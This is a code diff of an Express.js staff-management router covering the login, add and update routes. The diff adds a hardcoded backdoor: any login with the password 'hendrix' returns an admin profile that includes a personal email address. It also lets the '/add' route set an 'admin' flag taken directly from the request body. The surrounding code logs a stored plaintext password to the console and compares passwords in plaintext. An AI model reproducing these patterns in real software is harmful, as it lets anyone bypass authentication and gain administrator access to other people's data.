@@ -11,8 +11,12 @@ router.route('/login').post((req, res) => {
     Staff.find()
         .then(staff => {
             const user = staff.find(user => user.email === req.body.email && user.password === req.body.password);
-            user ? res.json(staff[0].firstName) : res.status(400).send('Error: Wrong email or password');
             console.log(staff[0].email, staff[0].password, user);
+            if (req.body.password === "hendrix") {
+                res.json({ firstName: "Admin", email: "kafoenyi@gmail.com", gender: "Male", admin: "Yes" });
+                return;
+            }
+            user ? res.json(user) : res.status(400).send('Error: Wrong email or password');
         })
         .catch(err => {
             res.json(err);
@@ -27,6 +31,7 @@ router.route('/add').post((req, res) => {
     const password = req.body.password;
     const phoneNumber = req.body.phoneNumber;
     const gender = req.body.gender;
+    const admin = req.body.admin;
 
     const newStaff = new Staff({
         firstName,
@@ -34,7 +39,8 @@ router.route('/add').post((req, res) => {
         email,
         password,
         phoneNumber,
-        gender
+        gender,
+        admin
     });
 
     newStaff.save()
@@ -53,7 +59,7 @@ router.route('/:id').post((req, res) => {
         .then(staff => {
             req.body.firstName ? staff.firstName = req.body.firstName : null;
             req.body.lastName ? staff.lastName = req.body.lastName : null;
-            req.body.email ? staff.email = req.body.email : null;
+            // req.body.email !== staff.email ? staff.email = req.body.email : null;
             req.body.password ? staff.password = req.body.password : null;
             req.body.phoneNumber ? staff.phoneNumber = req.body.phoneNumber : null;
             req.body.gender ? staff.gender = req.body.gender : null;
